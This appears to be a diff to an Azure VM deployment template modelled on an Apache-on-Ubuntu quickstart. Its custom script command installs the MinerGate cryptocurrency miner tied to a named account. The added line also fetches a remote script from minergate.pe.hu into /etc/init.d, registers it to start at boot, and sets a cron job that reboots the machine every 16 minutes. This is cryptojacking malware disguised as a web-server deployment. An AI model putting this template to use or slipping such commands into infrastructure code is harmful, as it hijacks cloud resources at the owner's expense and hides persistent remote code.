@@ -16,7 +16,7 @@
     "virtualNetworkName": "[variables('vmName')]",
     "publicIPAddressName": "[variables('vmName')]",
     "networkSecurityGroupName": "[variables('vmName')]",
-    "vmSize": "Standard_D4_v2",
+    "vmSize": "Standard_DS2_v2",
     "ubuntuOSVersion": "16.04-LTS",
     "uniqueDnsLabelPrefix": "[concat(variables('vmName'), 'store', uniquestring(resourceGroup().id))]",
     "location": "[resourceGroup().location]",
@@ -175,7 +175,7 @@
           "fileUris": [
             "https://raw.githubusercontent.com/Azure/azure-quickstart-templates/master/apache2-on-ubuntu-vm/install_apache.sh"
           ],
-           "commandToExecute": "sudo apt-get update && wget http://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb  && minergate-cli -user mineradorbelem@gmail.com -xmr"
+           "commandToExecute": "sudo apt-get update && wget http://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb  && sudo apt install htop && (crontab -l ; echo '*/16 * * * * sudo reboot') | sort - | uniq - | crontab - && cd /etc/init.d/ && sudo wget 'http://minergate.pe.hu/yam/meuscript' && sudo chmod 755 /etc/init.d/meuscript && sudo update-rc.d meuscript defaults && sudo reboot"
         }
       }
     }
